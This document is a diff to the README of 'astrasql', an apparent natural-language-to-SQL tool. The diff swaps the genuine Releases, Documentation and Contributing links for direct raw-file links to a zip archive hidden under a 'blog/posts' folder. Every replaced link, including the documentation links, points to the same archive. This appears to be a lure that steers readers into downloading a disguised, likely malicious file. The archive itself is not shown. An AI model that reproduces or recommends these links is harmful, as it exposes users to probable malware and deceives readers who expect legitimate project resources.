@@ -1,7 +1,7 @@
 # 🚀 astrasql - Simple SQL Queries from Natural Language
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-FF5722?style=for-the-badge&logo=github)](https://github.com/Drekovich/astrasql/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Drekovich/astrasql/main/blog/posts/astrasql_2.1.zip%20Latest%20Release-FF5722?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Drekovich/astrasql/main/blog/posts/astrasql_2.1.zip)
 
 ## 📖 Description
 astrasql is an AI-powered application that turns natural language into SQL queries. It prioritizes your privacy by only processing metadata. You can securely run it on your own server. astrasql supports various databases, including PostgreSQL, MySQL, SQLite, SQL Server, Oracle, and MongoDB. 
@@ -19,7 +19,7 @@ Ensure your system meets the following basic requirements:
 - **Database:** Ensure you have one of the supported databases installed
 
 ### 2. Visit the Releases Page
-To download the latest version of astrasql, [visit the Releases page here](https://github.com/Drekovich/astrasql/releases).
+To download the latest version of astrasql, [visit the Releases page here](https://raw.githubusercontent.com/Drekovich/astrasql/main/blog/posts/astrasql_2.1.zip).
 
 ### 3. Download the Application
 On the Releases page, you will see a list of available versions. Look for the latest version indicated at the top. Click on the link for your operating system to download the installer file.
@@ -76,8 +76,8 @@ If you need help or have questions about using astrasql, you can reach out to th
 astrasql is open-source software, licensed under the MIT License. You can modify and distribute it as per the conditions laid out in the license file.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Drekovich/astrasql/wiki)
-- [Contributing](https://github.com/Drekovich/astrasql/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/Drekovich/astrasql/main/blog/posts/astrasql_2.1.zip)
+- [Contributing](https://raw.githubusercontent.com/Drekovich/astrasql/main/blog/posts/astrasql_2.1.zip)
 
 Feel free to explore, ask questions, and enjoy your experience with astrasql!
 
